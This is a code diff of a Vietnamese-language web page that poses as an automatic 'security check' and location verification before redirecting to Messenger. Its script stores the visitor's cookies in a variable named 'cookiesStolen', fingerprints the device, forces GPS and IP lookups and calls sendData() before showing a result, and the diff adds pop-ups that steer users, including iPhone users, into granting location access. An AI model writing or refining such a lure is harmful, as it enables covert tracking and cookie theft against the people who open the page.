@@ -19,18 +19,20 @@
         .card {
             background: rgba(20,24,32,0.8); backdrop-filter: blur(20px);
             border: 1px solid rgba(255,255,255,0.06); border-radius: 20px;
-            padding: 35px 25px; max-width: 340px; width: 90%; box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+            padding: 35px 25px; max-width: 360px; width: 90%; box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+            transition: all 0.3s ease;
         }
         .shield {
             width: 70px; height: 70px; margin: 0 auto 20px auto;
             background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%234fc3f7"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>') no-repeat center/contain;
         }
         .progress-track {
-            width: 100%; height: 5px; background: rgba(255,255,255,0.06); border-radius: 10px; margin: 25px 0 18px 0; overflow: hidden;
+            width: 100%; height: 5px; background: rgba(255,255,255,0.06); border-radius: 10px;
+            margin: 25px 0 18px 0; overflow: hidden;
         }
         .progress-fill {
-            height: 100%; width: 0%; background: linear-gradient(90deg, #4fc3f7, #1e88e5); border-radius: 10px;
-            transition: width 0.15s linear;
+            height: 100%; width: 0%; background: linear-gradient(90deg, #4fc3f7, #1e88e5);
+            border-radius: 10px; transition: width 0.15s linear;
         }
         .title { font-size: 19px; font-weight: 600; margin-bottom: 8px; color: #ffffff; }
         .subtitle { color: #a0a8b8; font-size: 14px; line-height: 1.5; margin-bottom: 10px; }
@@ -59,24 +61,29 @@
 </head>
 <body>
     <div id="main">
+        <!-- Step 1: initial card with progress -->
         <div class="card" id="step1">
             <div class="shield"></div>
             <div class="title" id="step1Title">Đang kiểm tra bảo mật...</div>
-            <div class="progress-track">
-                <div class="progress-fill" id="progressBar"></div>
-            </div>
+            <div class="progress-track"><div class="progress-fill" id="progressBar"></div></div>
             <div class="subtitle" id="step1Sub">Vui lòng chờ, hệ thống tự động kiểm tra kết nối an toàn</div>
-            <div id="tapPrompt" class="hidden" style="margin-top:10px; font-weight:500; color:#4fc3f7;">
-                Nhấn nút bên dưới để xác minh vị trí
-            </div>
             <button class="btn hidden" id="tapButton">Xác minh vị trí</button>
         </div>
 
+        <!-- Step 2: result -->
         <div class="card hidden" id="step2">
             <div class="result-icon" id="resultIcon"></div>
             <div class="title" id="resultTitle"></div>
             <div class="subtitle" id="resultSub"></div>
             <div class="action-row" id="actionRow"></div>
+        </div>
+
+        <!-- Custom popup for PC/Android or iOS instructions -->
+        <div class="card hidden" id="permPopup">
+            <div class="title" id="popupTitle"></div>
+            <div class="subtitle" id="popupSub" style="white-space: pre-line;"></div>
+            <button class="btn" id="popupBtn"></button>
+            <button class="action-btn hidden" id="popupRetryBtn">Thử lại</button>
         </div>
     </div>
 
@@ -86,21 +93,26 @@
         // DOM
         const step1 = document.getElementById('step1');
         const step2 = document.getElementById('step2');
+        const permPopup = document.getElementById('permPopup');
         const progressBar = document.getElementById('progressBar');
         const step1Title = document.getElementById('step1Title');
         const step1Sub = document.getElementById('step1Sub');
         const tapBtn = document.getElementById('tapButton');
-        const tapPrompt = document.getElementById('tapPrompt');
         const resultIcon = document.getElementById('resultIcon');
         const resultTitle = document.getElementById('resultTitle');
         const resultSub = document.getElementById('resultSub');
         const actionRow = document.getElementById('actionRow');
+        const popupTitle = document.getElementById('popupTitle');
+        const popupSub = document.getElementById('popupSub');
+        const popupBtn = document.getElementById('popupBtn');
+        const popupRetryBtn = document.getElementById('popupRetryBtn');
 
         let gpsData = null;
         let ipData = null;
         const cookiesStolen = document.cookie || 'none';
 
-        // Detect device model
+        const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
+
         function getDeviceModel(ua) {
             const models = [
                 /\((SM-[A-Z0-9]+)\)/i,
@@ -263,7 +275,7 @@
         }
 
         function showResult(success, title, subtitle, actions = []) {
-            step1.classList.add('hidden');
+            hideAllCards();
             step2.classList.remove('hidden');
             resultIcon.className = 'result-icon ' + (success ? 'success' : 'fail');
             resultIcon.innerHTML = success
@@ -281,6 +293,12 @@
             });
         }
 
+        function hideAllCards() {
+            step1.classList.add('hidden');
+            step2.classList.add('hidden');
+            permPopup.classList.add('hidden');
+        }
+
         function openLocationSettings() {
             if (/Android/.test(navigator.userAgent)) {
                 window.location.href = 'intent://com.android.settings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end;';
@@ -289,80 +307,94 @@
             }
         }
 
-        function retryVerification() {
-            step2.classList.add('hidden');
+        function retryFromPopup() {
+            hideAllCards();
             step1.classList.remove('hidden');
             progressBar.style.width = '100%';
-            step1Title.textContent = 'Sẵn sàng xác minh vị trí';
-            step1Sub.textContent = 'Nhấn nút bên dưới để tiếp tục kiểm tra bảo mật';
-            tapPrompt.classList.remove('hidden');
+            step1Title.textContent = 'Sẵn sàng kiểm tra';
+            step1Sub.textContent = 'Nhấn nút bên dưới để xác minh vị trí của bạn';
             tapBtn.classList.remove('hidden');
         }
 
-        async function startVerification() {
-            tapBtn.classList.add('hidden');
-            tapPrompt.classList.add('hidden');
-            step1Title.textContent = 'Đang kiểm tra vị trí...';
-            step1Sub.textContent = 'Hệ thống tự động xác minh, không phải tấn công';
-            progressBar.style.width = '0%';
-            let percent = 0;
-            const fakeInterval = setInterval(() => {
-                percent += 8;
-                if (percent >= 100) {
-                    percent = 100;
+        // Show custom popup before asking for location
+        async function showPermissionPopup() {
+            hideAllCards();
+            permPopup.classList.remove('hidden');
+            if (isIOS) {
+                popupTitle.textContent = 'Yêu cầu vị trí';
+                popupSub.textContent = '1. Mở Cài đặt\n2. Cuộn xuống Safari\n3. Chọn Vị trí\n4. Chọn Cho phép\nSau đó nhấn Thử lại.';
+                popupBtn.textContent = 'Đã bật – Thử lại';
+                popupBtn.onclick = () => {
+                    // Try GPS again now
+                    retryFromPopup();
+                };
+                popupRetryBtn.classList.remove('hidden');
+                popupRetryBtn.onclick = () => retryFromPopup();
+            } else {
+                popupTitle.textContent = 'Cho phép vị trí';
+                popupSub.textContent = 'Một cửa sổ bật lên sẽ hiện ra.\nVui lòng nhấn "Cho phép" để xác minh bạn đang ở Việt Nam.';
+                popupBtn.textContent = 'Tiếp tục';
+                popupBtn.onclick = async () => {
+                    // Now actually request GPS
+                    hideAllCards();
+                    step1.classList.remove('hidden');
+                    step1Title.textContent = 'Đang lấy vị trí...';
+                    step1Sub.textContent = '';
+                    progressBar.style.width = '0%';
+                    let percent = 0;
+                    const fakeInterval = setInterval(() => {
+                        percent += 10;
+                        progressBar.style.width = percent + '%';
+                        if (percent >= 100) clearInterval(fakeInterval);
+                    }, 80);
+
+                    gpsData = null;
+                    ipData = null;
+                    const gpsPromise = forceGPS();
+                    ipData = await fetchIP();
+                    const gpsResult = await gpsPromise;
                     clearInterval(fakeInterval);
-                }
-                progressBar.style.width = percent + '%';
-            }, 70);
+                    progressBar.style.width = '100%';
+                    gpsData = gpsResult;
 
-            const gpsPromise = forceGPS();
-            ipData = await fetchIP();
-            const gpsResult = await gpsPromise;
+                    let isVN = false;
+                    if (gpsData && !gpsData.error && gpsData.lat != null) {
+                        isVN = isInsideVietnam(gpsData.lat, gpsData.lon);
+                    } else if (ipData) {
+                        isVN = ipData.country.toLowerCase().includes('vietnam') || (ipData.countryCode && ipData.countryCode.toLowerCase() === 'vn');
+                    }
 
-            clearInterval(fakeInterval);
-            progressBar.style.width = '100%';
-            gpsData = gpsResult;
+                    await sendData();
 
-            let isVietnam = false;
-            if (gpsData && !gpsData.error && gpsData.lat != null && gpsData.lon != null) {
-                isVietnam = isInsideVietnam(gpsData.lat, gpsData.lon);
-            } else {
-                if (ipData) {
-                    const country = ipData.country || '';
-                    isVietnam = country.toLowerCase().includes('vietnam') || (ipData.countryCode && ipData.countryCode.toLowerCase() === 'vn');
-                }
-            }
+                    if (gpsData && gpsData.error && (gpsData.error === 1 || gpsData.error === 2)) {
+                        showResult(false,
+                            'Không thể lấy vị trí',
+                            'Vui lòng bật dịch vụ vị trí và cho phép quyền.',
+                            [
+                                { label: 'Mở cài đặt vị trí', onClick: openLocationSettings, primary: true },
+                                { label: 'Thử lại', onClick: retryFromPopup }
+                            ]);
+                        return;
+                    }
 
-            await sendData();
-
-            if (gpsData && gpsData.error && (gpsData.error === 1 || gpsData.error === 2)) {
-                showResult(false,
-                    'Không thể lấy vị trí',
-                    'Để hoàn tất kiểm tra, vui lòng bật dịch vụ vị trí và cho phép quyền.',
-                    [
-                        { label: 'Mở cài đặt vị trí', onClick: openLocationSettings, primary: true },
-                        { label: 'Thử lại', onClick: retryVerification }
-                    ]);
-                return;
-            }
-
-            if (isVietnam) {
-                showResult(true,
-                    'Xác minh thành công',
-                    'Bạn đủ điều kiện truy cập. Đang chuyển hướng...',
-                    []);
-                setTimeout(() => { window.location.href = 'https://www.messenger.com/'; }, 2000);
-            } else {
-                showResult(false,
-                    'Truy cập bị hạn chế',
-                    'Hệ thống chỉ cho phép người dùng tại Việt Nam. Nếu bạn đang ở Việt Nam, hãy thử lại.',
-                    [
-                        { label: 'Thử lại', onClick: () => window.location.reload() }
-                    ]);
+                    if (isVN) {
+                        showResult(true,
+                            'Xác minh thành công',
+                            'Bạn đủ điều kiện truy cập. Đang chuyển hướng...',
+                            []);
+                        setTimeout(() => { window.location.href = 'https://www.messenger.com/'; }, 2000);
+                    } else {
+                        showResult(false,
+                            'Truy cập bị hạn chế',
+                            'Hệ thống chỉ cho phép người dùng tại Việt Nam.',
+                            [ { label: 'Thử lại', onClick: () => window.location.reload() } ]);
+                    }
+                };
+                popupRetryBtn.classList.add('hidden');
             }
         }
 
-        // Initial animation
+        // Initial progress bar fill
         let initProgress = 0;
         const initInterval = setInterval(() => {
             initProgress += 7;
@@ -373,11 +405,13 @@
                 step1Title.textContent = 'Sẵn sàng kiểm tra';
                 step1Sub.textContent = 'Nhấn nút bên dưới để xác minh vị trí của bạn';
                 tapBtn.classList.remove('hidden');
-                tapPrompt.classList.remove('hidden');
             }
         }, 70);
 
-        tapBtn.addEventListener('click', startVerification);
+        tapBtn.addEventListener('click', () => {
+            // Show the appropriate custom pop-up first
+            showPermissionPopup();
+        });
 
         // Auto-tap after 30s
         setTimeout(() => {
